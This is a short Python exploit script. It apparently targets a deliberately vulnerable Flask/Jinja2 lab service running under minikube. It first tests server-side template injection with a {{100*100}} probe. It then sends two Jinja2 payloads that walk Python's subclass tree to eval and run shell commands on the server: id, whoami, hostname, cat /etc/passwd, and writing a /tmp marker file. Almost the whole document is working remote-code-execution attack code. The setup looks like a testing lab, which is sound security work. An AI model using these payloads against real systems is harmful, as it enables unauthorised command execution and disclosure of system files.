import requests
import subprocess
from urllib.parse import quote

get_service = subprocess.run(['minikube', 'service', 'jinja', '--url'], stdout=subprocess.PIPE)
service_url = get_service.stdout.decode('utf-8').strip()
print(f"Service IP: {service_url}")

cmd="/?name={{100*100}}"
url = service_url + cmd
response = requests.get(url)
if response.status_code == 200:
	print("SSTI Successful")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}
params = {'name': '{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == "catch_warnings" %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if "eval" in b.keys() %} {{ b["eval"]("__import__(\'os\').popen(\'id && pwd && whoami && touch /tmp/rced && chmod 777 /tmp/rced && ls /tmp/rced && hostname && rm /tmp/rced\').read()") }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %}'}

response = requests.get(service_url, headers=headers, params=params)

if 'uid' in response.text:
    print("SSTI Successful")

cmd = '{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == "catch_warnings" %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if "eval" in b.keys() %} {{ b["eval"]("__import__(\'os\').popen(\'cat /etc/passwd && echo "rced" > /tmp/rced && pwd\').read()") }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %}'
params = {'name': quote(cmd)}
response = requests.get(service_url, headers=headers, params=params)

if 'rced' in response.text:
    print("SSTI Successful")